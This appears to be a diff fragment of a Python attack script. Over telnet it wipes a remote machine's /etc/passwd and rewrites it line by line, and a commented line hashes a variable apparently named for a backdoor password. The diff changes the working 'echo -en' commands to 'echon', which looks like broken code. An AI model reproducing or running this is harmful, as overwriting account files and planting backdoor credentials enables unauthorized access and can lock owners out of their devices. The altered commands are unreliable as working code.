@@ -261,10 +261,10 @@ def main():
             #line[1] = crypt.crypt(bdpasswd, '$1$' + salt + '$')
             data = data.replace(i, ":".join(line))
             break
-    tn.write('echo -en "" > /etc/passwd\n')
+    tn.write('echon "" > /etc/passwd\n')
     time.sleep(5)
     for i in data.split("\n"):
-        tn.write('echo -en \'' + i + '\n\' >> /etc/passwd\n')
+        tn.write('echon \'' + i + '\n\' >> /etc/passwd\n')
         time.sleep(1)
     data = tn.read_very_eager()    
     tn.close()
